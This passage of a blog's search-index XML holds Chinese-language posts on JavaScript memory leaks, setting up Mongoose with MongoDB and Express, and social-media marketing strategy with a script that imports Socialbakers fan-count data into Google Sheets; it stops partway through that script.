            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>網站常見 Memory Leak</title>
      <link href="/2019/10/01/js-memory-leak/"/>
      <url>/2019/10/01/js-memory-leak/</url>
      
        <content type="html"><![CDATA[<p>記憶體流失（Memory Leak）的原因是在程式撰寫上的常見錯誤，當使用無內建垃圾回收機制的語言，更容易因為疏忽造成記憶體無法釋放被再次使用的結果，最終讓程式效能因使用時間拉長而變差。</p><h2 id="Memory-Leak-原因"><a href="#Memory-Leak-原因" class="headerlink" title="Memory Leak 原因"></a>Memory Leak 原因</h2><p>記憶體流失 (Memory Leak) 發生的原因，依照程式語言的回收機制可分成兩種:</p><ol><li>沒有回收機制: C 或是 C++ 在存取與 process 獨立的資源後要記得手動釋放</li><li>有回收機制: 即使像 Java 或 JavaScript 這類有回收機制的語言，仍有可能因撰寫疏忽造成記憶體無法被自動回收，常見記憶體流失（Memory leak）的情境如下:<ul><li>循環參照</li><li>事件循環監聽</li><li>存取全域變數</li></ul></li></ol><h3 id="循環參照"><a href="#循環參照" class="headerlink" title="循環參照"></a>循環參照</h3><p>同時太多地方去存取同個資源，對自動回收機制來說，就無法確定資源什麼時候沒有被使用。舉例生活上的例子來說:</p><ol><li>A 需要今天下午抄 B 的答案才能交作業</li><li>B 需要今天下午抄 A 的答案才能交作業</li></ol><h4 id="Memory-Leak-工具推薦"><a href="#Memory-Leak-工具推薦" class="headerlink" title="Memory Leak 工具推薦"></a>Memory Leak 工具推薦</h4><p>這邊推薦一個方便的套件叫做 <code>madge</code> 可以幫我們產生圖像化的參照圖。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> madge = <span class="built_in">require</span>(<span class="string">&quot;madge&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">madge</span>(<span class="string">&quot;path/to/app.js&quot;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">image</span>(<span class="string">&quot;path/to/image.svg&quot;</span>))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">writtenImagePath</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Image written to &quot;</span> + writtenImagePath);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><blockquote><p>紅色就代表有循環參照 (circular dependencies) 產生<br><img src="http://pahen.github.io/madge/simple.svg" alt="CircularDependencies"></p></blockquote><h3 id="事件循環監聽"><a href="#事件循環監聽" class="headerlink" title="事件循環監聽"></a>事件循環監聽</h3><p>在程式的撰寫上，可能因為疏忽就一直增加監聽。舉例生活上的例子來說:</p><ol><li>A 收到問題後，請 B 幫忙查詢問題</li><li>B 收到問題後，請 C 幫忙查詢問題</li><li>C 收到問題後，請 A 幫忙查詢問題</li></ol><p>舉 Socket.IO 的例子來說，主要是以下兩個功能:</p><ul><li>監聽訂閱的訊息</li><li>針對監聽到的訊息再發送訊息</li></ul><p>在這兩個功能互動的過程中，如果需要和 React.js 搭配使用，就要注意 Rerender 時:</p><ul><li>是否重複產生新的 socket</li><li>是否重複監聽事件</li></ul><h3 id="存取全域變數"><a href="#存取全域變數" class="headerlink" title="存取全域變數"></a>存取全域變數</h3><p>避免 closure 去存取到全域變數，像是 setInterval 遇上 closure。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">  bar = <span class="string">&quot;this is a hidden global variable&quot;</span>;</span><br><span class="line">  <span class="comment">//  window.bar = &quot;this is a hidden global variable&quot;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Memory-Leak-解決"><a href="#Memory-Leak-解決" class="headerlink" title="Memory Leak 解決"></a>Memory Leak 解決</h2><ol><li>使用 <code>delete</code> 和將變數設為 <code>null</code>，手動告訴機器這個物件沒有使用了</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myVar = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> myVar1 = myVar;</span><br><span class="line">myVar = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">delete</span> myVar;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myVar1);</span><br></pre></td></tr></table></figure><ol start="2"><li>利用開發者工具中的快照，簡單用法就是使用一陣子之後重新抓一次快照，觀察記憶體有沒有上升太多</li><li>事件中的 listener 可以放個 <code>console.log(&#39;避免重複監聽&#39;)</code> 來暴力觀察</li></ol><p>參考連結:</p><ul><li><a href="https://developers.google.com/web/tools/chrome-devtools/memory-problems/?hl=zh-tw">https://developers.google.com/web/tools/chrome-devtools/memory-problems/?hl=zh-tw</a></li><li><a href="https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Memory_Management">https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Memory_Management</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mongoose 是什麼</title>
      <link href="/2019/09/07/tool-mongoose-mongo/"/>
      <url>/2019/09/07/tool-mongoose-mongo/</url>
      
        <content type="html"><![CDATA[<p>Mongoose 是讓開發者透過 ODM (Object Data Model) 的概念來連接並操作 MongoDB 的一套工具，透過 npm 就能夠下載安裝使用。</p><p>網站有分成前跟後端，而 Mongoose 也可以看成是 MongoDB 的前端介面。</p><h2 id="Mongoose-觀念與名詞"><a href="#Mongoose-觀念與名詞" class="headerlink" title="Mongoose 觀念與名詞"></a>Mongoose 觀念與名詞</h2><p>Mongoose 提供了 schema-based 的解決方案讓我們直接操作資料，在透過 Mongoose 操作資料庫時，有幾個名詞要先有概念:</p><ol><li>Schema: 存資料庫模型的檔案</li><li>Model: 由 Schema 當參數產生的 instance 可以用來操作資料庫</li><li>collection: 在 MongoDB 中的表</li></ol><h3 id="什麼是-ODM-ORM"><a href="#什麼是-ODM-ORM" class="headerlink" title="什麼是 ODM&#x2F;ORM?"></a>什麼是 ODM&#x2F;ORM?</h3><p>由於 Express 這類框架無法操作資料庫，所以將資料表示為 JavaScript 的 Object，再透過 ODM&#x2F;ORM 工具定義的 data schema 去操作資料庫，透過 Mongoose 就可以達到操作資料庫的目的，ODM&#x2F;ORM 通常可以降低開發及維護成本，因此一般情況下都推薦使用。</p><ul><li>ODM: Object Data Model，對應 NoSQL Database</li><li>ORM: Object Relational Model，對應 SQL-Bsaed Database</li></ul><h2 id="三步驟從資料庫到-API"><a href="#三步驟從資料庫到-API" class="headerlink" title="三步驟從資料庫到 API"></a>三步驟從資料庫到 API</h2><ol><li>Mongo DB 資料庫設定</li><li>Mongoose Schema 設計</li><li>Mongoose ODM 資料操作</li></ol><h3 id="Mongo-DB-資料庫設定"><a href="#Mongo-DB-資料庫設定" class="headerlink" title="Mongo DB 資料庫設定"></a>Mongo DB 資料庫設定</h3><p>最常用的就是運用 Mongoose 搭配 Mongo DB:</p><ol><li>在安裝完 Mongo 後，進入 shell 去連線看看 <code>mongo --port 27017</code></li><li>成功連線後可以選擇資料庫開始下指令，像是 <code>use test</code></li><li>進入 test 中設定使用者及權限:</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="title function_">dropAllUsers</span>();</span><br><span class="line">db.<span class="title function_">createUser</span>(&#123;</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="attr">pwd</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="attr">roles</span>: [&#123; <span class="attr">role</span>: <span class="string">&quot;readWrite&quot;</span>, <span class="attr">db</span>: <span class="string">&quot;test&quot;</span> &#125;],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="4"><li>資料庫為了安全起見會要將資料庫的 authorization 打開，windos 請<a href="https://blog.yowko.com/mongodb-enable-auth/">參考連結</a>，ubuntu 請去編輯 etc 資料夾底下的 Mongo 設定，加入設定如下：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security:</span><br><span class="line">   authorization: enabled</span><br></pre></td></tr></table></figure><h3 id="Mongoose-Schema-設計"><a href="#Mongoose-Schema-設計" class="headerlink" title="Mongoose Schema 設計"></a>Mongoose Schema 設計</h3><p>要使用 Mongoose 操作的第一步就是要從定義 Schema 開始，定義完成後 Schema 會自動對應到 MongoDB 中的一個 collection，另外因為不像傳統資料庫那樣有 join 的概念，所以拿資料的時候可以依照我們的使用情境去設計，像是以撈取為主的話就可以透過雙向參照的設計去加速，詳細可以參考<a href="https://blog.toright.com/posts/4537/mongodb-schema-%E8%A8%AD%E8%A8%88%E6%8C%87%E5%8D%97-part-ii-%E5%8F%8D%E6%AD%A3%E8%A6%8F%E5%8C%96%E7%9A%84%E5%A8%81%E5%8A%9B.html">MongoDB Schema 設計指南</a>，分類有以下幾種:</p><ul><li>Modeling One-to-Few 少量級關聯模式 (Embedding)</li><li>One-to-Many 多量級關聯模式 (Child-Referencing)</li><li>One-to-Squillions 海量級關聯模式 (Parent-Referencing)</li><li>Two-Way Referencing (雙向參照設計)</li><li>多對一反正規化 (Denormalizing from Many -&gt; One)</li></ul><h3 id="Mongoose-ODM-資料操作"><a href="#Mongoose-ODM-資料操作" class="headerlink" title="Mongoose ODM 資料操作"></a>Mongoose ODM 資料操作</h3><p>Mongoose 則是協助我們在 node.js 專案中操作 Mongo DB，在程式中定義好 schema (不需要開欄位)，確認資料庫連線沒有問題就可以直接開始操作了。</p><p>比較大的問題是 node.js 不像 C#.net 那樣的語言有工具可以自動產生程式碼和架構，所以這個部分就是看每個人的狀況去放置，但還是以關注點分離的概念為主:</p><ol><li>建立跟 MongoDB 的連線</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&quot;mongoose&quot;</span>);</span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&quot;mongodb://localhost:27017/test&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">useNewUrlParser</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">useUnifiedTopology</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>在 model 中定義 Schema 並創造一個 model</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * user model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userSchema = mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="title class_">String</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = mongoose.<span class="title function_">model</span>(<span class="string">&quot;user&quot;</span>, userSchema);</span><br></pre></td></tr></table></figure><ol start="3"><li>使用剛剛產生的 model instance 在 controller 中撈資料</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * user controller</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getUser</span> = (<span class="params">id</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">User</span> = <span class="built_in">require</span>(<span class="string">&quot;./model&quot;</span>);</span><br><span class="line">    <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; id &#125;).<span class="title function_">exec</span>(<span class="function">(<span class="params">error, docs</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(docs);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="4"><li>透過 route 開 API 給前端使用</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/v1/user&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">getUser</span>(<span class="string">&quot;defaultID&quot;</span>);</span><br><span class="line">  res.<span class="title function_">json</span>(user);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Mongoose-專案架構"><a href="#Mongoose-專案架構" class="headerlink" title="Mongoose 專案架構"></a>Mongoose 專案架構</h2><p>通常 Mongoose 會搭配一個後端的框架來做使用，像是 Express 或是 Koa 等等，那在網路上有看到常見的兩種架構。</p><ol><li>第一種是依照資料表去做區分，把同個資料表的 model、controller、route 集中存放，覺得較適合大型專案。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">├── src/</span><br><span class="line">│  ├── entities/                <span class="comment"># 按照資料表去區分</span></span><br><span class="line">│  │  └── user/                 <span class="comment"># 使用者表</span></span><br><span class="line">│  │     ├── model.js           <span class="comment"># Schema 定義</span></span><br><span class="line">│  │     ├── controller.js      <span class="comment"># 資料庫 CRUD</span></span><br><span class="line">│  │     └── route.js           <span class="comment"># API 設定</span></span><br><span class="line">│  └── index.js                 <span class="comment"># 入口</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><ol start="2"><li>第二種則是依照功能性，controller、routes、models 集中放置在各自的分類資料夾，覺得較適合小型專案。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├── src/</span><br><span class="line">│  ├── controller/              <span class="comment"># 資料庫 CRUD</span></span><br><span class="line">│  ├── routes/                  <span class="comment"># API 設定</span></span><br><span class="line">│  ├── models/                  <span class="comment"># Schema 定義</span></span><br><span class="line">│  └── index.js                 <span class="comment"># 程式入口</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Backend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜尋引擎與社群媒體策略</title>
      <link href="/2019/08/13/thinking-social-media-inside/"/>
      <url>/2019/08/13/thinking-social-media-inside/</url>
      
        <content type="html"><![CDATA[<p>在數位行銷和社群媒體經營的世界中，了解競爭對手和目標受眾的行為是一項重要技能。</p><p>本篇文章介紹了如何使用 Socialbakers 這款社群分析工具，配合簡單的 JavaScript 代碼，將社群平台（如 Facebook）上的數據抓取並匯入 Google Sheet 進行統計分析。</p><p>這項技術對於個人研究和觀察非常有用，但請記得遵循合法和道德規範，不進行商業用途。</p><h2 id="社群分析與行銷策略：5W1H"><a href="#社群分析與行銷策略：5W1H" class="headerlink" title="社群分析與行銷策略：5W1H"></a>社群分析與行銷策略：5W1H</h2><blockquote><p>社群，是人因為目標聚集</p></blockquote><p>在運用社群媒體數據時，了解受眾的基本特徵與行為至關重要。你可以從以下幾個方面來制定你的社群行銷策略：</p><ul><li>Who: 目標受眾是誰？他們的年齡、性別、興趣等。</li><li>What: 我們的目標是什麼？是增加曝光還是建立品牌忠誠度？</li><li>When: 何時是最佳的發佈時機？是否有節日或事件影響？</li><li>Where: 哪些平台或渠道最能接觸到你的受眾？例如，Facebook、Instagram 或 YouTube。</li><li>Why: 為何進行這樣的行銷活動？明確目標會指導行動。</li><li>How: 以什麼方式進行推廣？是否透過有影響力的 KOL 或是創意廣告來吸引受眾？</li></ul><p>接著透過像 Social Backer 的統計，從最多人使用的社群工具來觀察當地人在意的是什麼。</p><ul><li><a href="https://www.socialbakers.com/statistics/facebook/pages/total/taiwan/">Facebook</a></li><li><a href="https://www.socialbakers.com/statistics/youtube/channels/taiwan/">YouTube</a></li></ul><p>如果目標是年輕人 (me)，也可以從 IG 來著手，像是反送中屬於社會議題，至今兩個月左右已經有了 11 萬的 hash tag，值得好好關注 (香港人口 700 萬)。</p><ul><li><a href="https://ninjaoutreach.com/taiwan-influencers/">KOL</a></li><li><a href="https://influencermarketinghub.com/25-most-popular-instagram-hashtags/">Hash Tag</a></li></ul><p><img src="/2019/08/13/thinking-social-media-inside/instagram-hash-tag.png" alt="instagram-hash-tag"></p><h3 id="社群行銷戰略"><a href="#社群行銷戰略" class="headerlink" title="社群行銷戰略"></a>社群行銷戰略</h3><p>我認為做很多事情起心動念是很重要的，戰略就屬於這個層面，很多時候可怕的不是不努力，而是努力錯方向 Orz</p><p>那起手式就從每個人都很熟悉的提問方式： 5W1H 開始看起，</p><ul><li>Why：是我覺得最重要的，做任何事情都要知道自己為何去做，那我們大量曝光的目的在哪裡？是要賺錢或是傳道？</li><li>What：我們擁有什麼? 能夠做什麼? 常見的基本款就是用 STP 去分析，看看定位在哪? 區隔在哪? 目標在哪? 也可以透過觀察及蒐集相關數據看有無趨勢，盡可能在背景知識及材料足夠的情況下才去做 4P 的評估~</li><li>How &amp; Where：關鍵在於要在哪裡然後如何去打到受眾? 不管是線上線下，實體虛擬，廣告或是到達頁面，那在現在這個手機時代和傳統的方式有何差異? Donuts 巧妙的運用香味及聲音還有結點的組合技來進行攻擊，那可以思考的方向是在不同的節點是否有更多不同的做法和心理操作?</li><li>Who：誰是我們的 TA 那要怎麼找到 TA 進而讓我們的訊息打到 TA，那可以簡單的想像 TA 會是一個濃度的問題，越濃的地方越容易找到，這方面可以透過各種統計數據去推敲哪裡濃度較高~</li><li>When：什麼時候該去推廣相關事情？穩定重複發生的事件，就該提早做好準備，像是情人節的保護費；突發狀況但爆紅的事件，足夠的宅力以及追蹤相關大大，在第一時間及時做好相關對應動作；平時常蒐集歷久不衰的經典，這時候沒什麼特別好做的就可以做這個；觀察社會現象並給被動者一個逆襲的機會；</li></ul><p>生活中其實很多小事物值得好好關心，越是了解自己也會越了解身邊的人進而更了解社會～</p><ul><li>How much: 要記得評估我們有多少時間和金錢可以利用，有多少時間多少錢做多少事，將有限資源產生的效益最大化～</li></ul><h3 id="社群行銷戰術"><a href="#社群行銷戰術" class="headerlink" title="社群行銷戰術"></a>社群行銷戰術</h3><ul><li>對象性: 由於每個人有興趣有意義的定義都不相同，所以針對不同的 TA 投放的訊息要有對象性的投放，廣效的範圍攻擊通常攻擊力不強</li><li>社會特性: 台灣是一個易燃的社會，找到燃料了解燃點，我們就只需要準備火柴</li><li>經營: 把個人當成品牌經營 -&gt; 積極在社團做相關活動經營練習 -&gt; 社群的經營 (了解 KOL 的優勢劣勢並透過 KOL 讓系統自行運作)</li></ul><h3 id="社群行銷心理"><a href="#社群行銷心理" class="headerlink" title="社群行銷心理"></a>社群行銷心理</h3><p>訊息爆量，所以訊息需要快速短暫的爆擊，攻擊力強又有效率</p><ul><li>一頁式的到達頁面</li><li>資訊圖像化</li><li>洗腦品牌色印象(紅色包裝的舒跑應該是盜版的或著不是運動飲料)</li></ul><p>除了數據分析外，理解受眾的心理也是成功的社群行銷關鍵。以下是一些常見的心理策略：</p><ul><li>非理性期待: 每個人都是獨立個體，所以並無法用我們自己的角度推測他人行為</li><li>信任度: 要知道人為什麼會在特殊層面信任你，盡可能在這方面滿足對方</li><li>虛性和諧: 即使對方再沒用，只要能靠幾句話或是請杯飲料來達到降低工作量，何樂而不為，但如果得到的成果反而是扣分的，請果斷放棄</li><li>操作共感性: 同理別人同時也讓人可以同理你的感受，有意義感有夢想有感覺才有機會推動行為</li></ul><p>情緒曲線</p><ul><li>景正負我你 (by 許皓甯)</li></ul><p>推薦一個 google 免費線上數位行銷技巧培訓，底下是實體課程其中一門課程投影片參考:</p><p><a href="http://bit.ly/2kX9ahA">做好簡報說個好故事</a></p><iframe src="https://docs.google.com/presentation/d/e/2PACX-1vQ1HYggfMiQvJ6T7fMc8CjBQNjXZLiFcPQt7qmfIKssd4_s-lslpUWvMdRFVpG1yRd1YAhdy1duAJrT/embed?start=false&loop=false&delayms=3000" frameborder="0" max-width="480" width="100%" height="389" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe><h2 id="Socialbakers-資料抓取方法"><a href="#Socialbakers-資料抓取方法" class="headerlink" title="Socialbakers 資料抓取方法"></a>Socialbakers 資料抓取方法</h2><p>首先，通過 Socialbakers 的分析平台，你可以選擇你感興趣的 Facebook 粉絲專頁，並抓取其粉絲數量等關鍵數據。</p><p>舉例來說，透過下面的兩個示例連結，我們可以抓取泰國與韓國的社群數據：</p><ol><li><a href="https://api-sbks.socialbakersrs.com/charts/fb-pages/fans.html?ids=46251501064&interval=last_month">泰國連結</a></li><li><a href="https://api-sbks.socialbakersrs.com/charts/fb-pages/fans.html?ids=136845026417486&interval=last_month">韓國連結</a></li></ol><p><img src="/2019/08/13/thinking-social-media-inside/hicharts-data.png" alt="hicharts-data"></p><p>利用 JavaScript，可以抓取圖表中的數據，將其轉換為 JSON 格式，並進一步將這些數據導入到 Google Sheet 進行詳細分析。以下是抓取資料的基本程式碼範例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> yValues = chart.<span class="property">series</span>[<span class="number">0</span>].<span class="property">data</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> [data.<span class="property">y</span>]);</span><br><span class="line"><span class="title class_">JSON</span>.<span class="title function_">stringify</span>(yValues);</span><br></pre></td></tr></table></figure><p>抓到之後，我們可以透過 google 開放的 App Script，把剛剛得到的資料貼進來執行，就能夠匯入成功。</p><p><img src="/2019/08/13/thinking-social-media-inside/google-app-script.png" alt="google-app-script"><br><img src="/2019/08/13/thinking-social-media-inside/sheet-analysis.png" alt="sheet-analysis"></p><p>程式碼如下，第一欄為日期，所以我們從第二欄開始匯入。</p><p>將資料匯入 Google Sheet 使用 Google Apps Script，這樣你就能輕鬆將資料導入並進行後續分析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> arrayKo = [</span><br><span class="line">    [<span class="number">2126900</span>],</span><br><span class="line">    [<span class="number">2127537</span>],</span><br><span class="line">    [<span class="number">2127869</span>],</span><br><span class="line">    [<span class="number">2127856</span>],</span><br><span class="line">    [<span class="number">2127684</span>],</span><br><span class="line">    [<span class="number">2127530</span>],</span><br><span class="line">    [<span class="number">2127575</span>],</span><br><span class="line">    [<span class="number">2127604</span>],</span><br><span class="line">    [<span class="number">2127494</span>],</span><br><span class="line">    [<span class="number">2127392</span>],</span><br><span class="line">    [<span class="number">2127441</span>],</span><br><span class="line">    [<span class="number">2127469</span>],</span><br><span class="line">    [<span class="number">2127468</span>],</span><br><span class="line">    [<span class="number">2127453</span>],</span><br><span class="line">    [<span class="number">2127504</span>],</span><br><span class="line">    [<span class="number">2127529</span>],</span><br><span class="line">    [<span class="number">2127784</span>],</span><br><span class="line">    [<span class="number">2127701</span>],</span><br><span class="line">    [<span class="number">2127609</span>],</span><br><span class="line">    [<span class="number">2126818</span>],</span><br><span class="line">    [<span class="number">2126062</span>],</span><br><span class="line">    [<span class="number">2124417</span>],</span><br><span class="line">    [<span class="number">2120241</span>],</span><br><span class="line">    [<span class="number">2118302</span>],</span><br><span class="line">    [<span class="number">2117611</span>],</span><br><span class="line">    [<span class="number">2109668</span>],</span><br><span class="line">    [<span class="number">2099853</span>],</span><br><span class="line">    [<span class="number">2092609</span>],</span><br><span class="line">    [<span class="number">2088067</span>],</span><br><span class="line">    [<span class="number">2071181</span>],</span><br><span class="line">    [<span class="number">2050875</span>],</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">var</span> arrayThai = [</span><br><span class="line">    [<span class="number">2437107</span>],</span><br><span class="line">    [<span class="number">2437495</span>],</span><br><span class="line">    [<span class="number">2437827</span>],</span><br><span class="line">    [<span class="number">2438062</span>],</span><br><span class="line">    [<span class="number">2438283</span>],</span><br><span class="line">    [<span class="number">2438526</span>],</span><br><span class="line">    [<span class="number">2438877</span>],</span><br><span class="line">    [<span class="number">2439208</span>],</span><br><span class="line">    [<span class="number">2439553</span>],</span><br><span class="line">    [<span class="number">2439795</span>],</span><br><span class="line">    [<span class="number">2439998</span>],</span><br><span class="line">    [<span class="number">2440106</span>],</span><br><span class="line">    [<span class="number">2440274</span>],</span><br><span class="line">    [<span class="number">2440465</span>],</span><br><span class="line">    [<span class="number">2440566</span>],</span><br><span class="line">    [<span class="number">2440688</span>],</span><br><span class="line">    [<span class="number">2440992</span>],</span><br><span class="line">    [<span class="number">2441390</span>],</span><br><span class="line">    [<span class="number">2441917</span>],</span><br><span class="line">    [<span class="number">2442219</span>],</span><br><span class="line">    [<span class="number">2442444</span>],</span><br><span class="line">    [<span class="number">2442929</span>],</span><br><span class="line">    [<span class="number">2444325</span>],</span><br><span class="line">    [<span class="number">2444827</span>],</span><br><span class="line">    [<span class="number">2445387</span>],</span><br><span class="line">    [<span class="number">2445720</span>],</span><br><span class="line">    [<span class="number">2446088</span>],</span><br><span class="line">    [<span class="number">2446396</span>],</span><br><span class="line">    [<span class="number">2447244</span>],</span><br><span class="line">    [<span class="number">2448251</span>],</span><br><span class="line">    [<span class="number">2448905</span>],</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">var</span> sheet = <span class="title class_">SpreadsheetApp</span>.<span class="title function_">getActiveSpreadsheet</span>().<span class="title function_">getActiveSheet</span>();</span><br><span class="line">  